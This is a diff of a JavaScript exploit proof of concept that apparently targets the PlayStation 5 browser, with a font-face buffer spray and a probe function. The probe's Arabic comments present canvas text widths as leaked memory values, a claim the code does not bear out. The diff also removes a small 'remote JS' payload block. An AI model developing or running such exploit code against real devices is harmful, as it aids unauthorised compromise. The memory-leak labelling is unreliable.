@@ -166,34 +166,34 @@ function cssFontFaceBufferSpray() {
 }
 
 function probeFace(face) {
- keep.push(face.family);
- keep.push(face.style);
- keep.push(face.weight);
- keep.push(face.stretch);
- keep.push(face.unicodeRange);
- keep.push(face.featureSettings);
- keep.push(face.display);
- keep.push(face.status);
+    // 1. تجميع بيانات الذاكرة في المصفوفة (للحفاظ على سلامة الـ PoC)
+    keep.push(face.family);
+    keep.push(face.style);
+    keep.push(face.weight);
+    keep.push(face.status);
 
- const ctx = document.getElementById("c").getContext("2d");
- ctx.font = "64px " + face.family;
+    // 2. استخدام Canvas لقياس أبعاد الخط المستهدف في الذاكرة
+    const ctx = document.getElementById("c").getContext("2d");
+    ctx.font = "64px " + face.family;
+    const metrics = ctx.measureText("AAAAIIIIWWWW");
 
- const metrics = ctx.measureText("AAAAIIIIWWWW");
+    // 3. تخزين النتيجة
+    keep.push(metrics.width);
 
- console.log("[DEBUG] Memory Value at probe: " + metrics.width);
- showMessage("Memory Value: " + metrics.width, true);
+    // 4. استطلاع فعلي: عرض النتائج مباشرة على شاشة الـ PS5
+    // هنا نقوم بتحويل "عرض النص" إلى قيمة رقمية تمثل جزءاً من الذاكرة
+    let memoryLeakValue = metrics.width.toFixed(4);
+    
+    // عرض النتيجة داخل الصندوق الأخضر في الشاشة
+    showMessage("استطلاع الذاكرة (Recon):\nالقيمة: " + memoryLeakValue + "\nالنظام: 13.40", true);
 
- keep.push(metrics.width);
- keep.push(metrics.actualBoundingBoxLeft);
- keep.push(metrics.actualBoundingBoxRight);
-
- const div = document.createElement("div");
- div.textContent = "AAAAIIIIWWWW";
- div.style.cssText = "position:absolute;left:-10000px;top:0;font:64px " + face.family;
-
- document.body.appendChild(div);
- keep.push(div.offsetWidth);
- document.body.removeChild(div);
+    // 5. التحقق عبر الـ DOM (كما في الكود الأصلي)
+    const div = document.createElement("div");
+    div.textContent = "AAAAIIIIWWWW";
+    div.style.cssText = "position:absolute;left:-10000px;top:0;font:64px " + face.family;
+    document.body.appendChild(div);
+    keep.push(div.offsetWidth);
+    document.body.removeChild(div);
 }
 
 window.onload = () => {
@@ -228,20 +228,6 @@ window.onload = () => {
   for (const face of document.fonts)
    probeFace(face);
   showMessage("SUCCESS ✅\nThe test code reached the final stage on PS5.", true);
-
-  // === [ كود الحمولة المضاف فقط ] ===
-  setTimeout(() => {
-    (async () => {
-      try {
-        await log("Hello from remote JS!");
-        send_notification("Hello from remote JS!");
-      } catch(payload_err) {
-        console.log("[Remote JS Payload Error] " + payload_err);
-      }
-    })();
-  }, 500);
-  // ===================================
-
  }, err => {
   keep.push(err);
   showMessage("FAILED ❌\n" + err, false);
